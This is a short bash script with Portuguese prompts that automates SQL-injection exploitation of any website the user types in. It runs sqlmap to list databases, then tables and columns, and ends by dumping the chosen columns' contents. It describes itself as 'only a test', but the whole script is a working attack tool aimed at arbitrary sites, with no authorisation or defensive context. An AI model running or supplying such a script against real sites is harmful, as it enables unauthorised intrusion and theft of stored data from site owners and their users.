#!/bin/bash

#Digite o site isso é apenas um teste

echo "Digite um site para explorar a falha sql:"
read site
if sqlmap -u $site --dbs
then
        echo "Caso n tenha seguido para explorar a falha digite control+c e explore outro site"
        echo "Site encontrado continuando exploração..."
        echo "Digite o nome da database:"
        read data
        sqlmap -u $site -D $data --tables
        echo "Database encontrado continuando a exploração..."
        echo "Digite a tabela:"
        read tabela
        sqlmap -u $site -D $data -T $tabela --columns
        echo "Tabela encontrada continuando exploração..."
        echo "Digite as colunas:"
        read col
        sqlmap -u $site -D $data -T $tabela -C $col --dump
        echo "Fim da exploração!"
else
        echo "Exploração n iniciada por falta de informação"
fi

